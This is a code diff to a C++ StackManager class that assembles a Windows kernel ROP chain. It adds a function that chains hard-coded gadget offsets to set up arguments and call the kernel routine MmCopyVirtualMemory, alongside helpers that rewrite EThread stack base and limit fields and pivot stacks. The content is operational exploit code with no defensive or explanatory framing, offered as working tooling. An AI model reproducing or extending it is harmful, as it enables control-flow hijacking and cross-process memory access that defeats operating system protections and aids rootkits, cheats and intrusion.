@@ -47,11 +47,6 @@ void StackManager::ReadIntoRcx(const std::uint64_t ReadAddress)
     this->AddGadget(0xa9b72d, "mov rcx, r9; mov qword ptr \[[a-zA-Z0-9]{2,3}\], [a-zA-Z0-9]{2,3}; ret;");
 }
 
-void StackManager::ReadIntoR8(const std::uint64_t ReadAddress)
-{
-
-}
-
 void StackManager::ReadRaxIntoRax()
 {
     this->AddGadget(0x27af45, "mov rax, qword ptr \[rax\]; ret;");
@@ -150,6 +145,34 @@ void StackManager::ModifyThreadStackBaseAndLimit(const std::uint64_t NewStackBas
 	constexpr std::uint64_t EThreadStackLimitOffset = 0x30;
 	this->ModifyThreadField(EThreadStackBaseOffset, NewStackBase);
 	this->ModifyThreadField(EThreadStackLimitOffset, NewStackLimit);
+}
+
+void StackManager::CallMmCopyVirtualMemory(void* SourceProcess, void* SourceAddress, void* TargetProcess, void* TargetAddress, int PreviousMode, const std::size_t BufferSize, void* ReturnSize)
+{
+    // first arg
+    this->ReadIntoRcx(reinterpret_cast<std::uint64_t>(SourceProcess));
+    // fourth arg
+    this->SetRdx(reinterpret_cast<std::uint64_t>(TargetAddress));
+    this->AddGadget(0x21307f, "mov rax, rdx; ret;");
+    this->MovRaxIntoR9();
+    // third arg
+    this->SetRdx(reinterpret_cast<std::uint64_t>(TargetProcess));
+    this->AddGadget(0x21307f, "mov rax, rdx; ret;");
+    this->ReadRaxIntoRax();
+    this->MovRaxIntoR8();
+    // second arg
+    this->SetRdx(reinterpret_cast<std::uint64_t>(SourceAddress));
+    // perform call
+    this->AlignStack();
+    this->AddGadget(Driver::GetKernelFunctionOffset("MmCopyVirtualMemory"), "MmCopyVirtualMemory address");
+    // clean up shadow space + args after call
+    this->AddGadget(0x20268c, "add rsp, 0x38; ret;");
+    // shadow space
+    this->AddPadding(0x20);
+    // stack args
+    this->AddValue(BufferSize, "size"); 
+    this->AddValue(PreviousMode, "previous mode");
+    this->AddValue(reinterpret_cast<std::uint64_t>(ReturnSize), "bytes addr");
 }
 
 void StackManager::PivotToNewStack(StackManager& NewStack)
